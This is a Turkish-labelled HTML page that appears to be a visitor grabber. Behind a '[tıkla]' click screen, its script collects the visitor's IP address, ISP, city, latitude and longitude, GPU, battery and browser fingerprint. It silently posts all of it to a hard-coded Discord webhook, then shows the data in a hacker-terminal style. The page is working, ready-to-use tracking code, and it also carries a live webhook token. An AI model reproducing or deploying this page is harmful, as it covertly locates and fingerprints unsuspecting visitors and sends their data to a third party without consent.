<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>zyliex</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #000; color: #00ff00; height: 100vh; overflow: hidden; }
        #entry-screen { position: fixed; top:0; left:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; cursor:pointer; }
        #main-content { display: none; padding: 20px; height: 100vh; overflow-y: auto; }
        .info-line { font-size: 14px; margin-bottom: 3px; }
    </style>
</head>
<body>

    <div id="entry-screen"><div>[tıkla]</div></div>

    <div id="main-content">
        <div id="info-display"></div>
    </div>

    <script>
        document.getElementById('entry-screen').addEventListener('click', async function() {
            this.style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
            
            const display = document.getElementById('info-display');
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
            const connection = navigator.connection || {};
            
            const infoLines = [
                `--- NETWORK ---`,
                `IP ADDRESS: ${ipData.ip}`,
                `ISP: ${ipData.org}`,
                `ASN: ${ipData.asn}`,
                `KONUM: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
                `LAT/LONG: ${ipData.latitude}, ${ipData.longitude}`,
                `TIMEZONE: ${ipData.timezone}`,
                `BAĞLANTI TÜRÜ: ${connection.effectiveType || 'N/A'}`,
                `DOWNLINK: ${connection.downlink || 'N/A'} Mbps`,
                `--- HARDWARE ---`,
                `CPU THREADS: ${navigator.hardwareConcurrency}`,
                `GPU VENDOR: ${getGPUInfo('vendor')}`,
                `GPU RENDERER: ${getGPUInfo('renderer')}`,
                `RAM (JS HEAP): ${(performance.memory ? (performance.memory.totalJSHeapSize / 1048576).toFixed(0) + ' MB' : 'Kısıtlı')}`,
                `PİL SEVİYESİ: ${(battery.level * 100).toFixed(0)}%`,
                `ŞARJ DURUMU: ${battery.charging ? 'EVET' : 'HAYIR'}`,
                `--- BROWSER & SYSTEM ---`,
                `USER AGENT: ${navigator.userAgent}`,
                `PLATFORM: ${navigator.platform}`,
                `DİL: ${navigator.language}`,
                `ÇEREZLER: ${navigator.cookieEnabled ? 'AÇIK' : 'KAPALI'}`,
                `DO NOT TRACK: ${navigator.doNotTrack || 'Bilinmiyor'}`,
                `EKRAN: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
                `PENCERE: ${window.innerWidth}x${window.innerHeight}`,
                `ZAMAN: ${new Date().toLocaleString()}`
            ];

            fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "🔍 **üye**",
                    embeds: [{
                        color: 0x00ff00,
                        description: infoLines.join('\n')
                    }]
                })
            });

            infoLines.forEach((line, i) => {
                setTimeout(() => {
                    const div = document.createElement('div');
                    div.className = 'info-line';
                    div.textContent = `> ${line}`;
                    display.appendChild(div);
                }, i * 100);
            });
        });

        function getGPUInfo(type) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return "Desteklenmiyor";
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            return debug ? (type === 'vendor' ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)) : "Bilinmiyor";
        }
    </script>
</body>
</html>
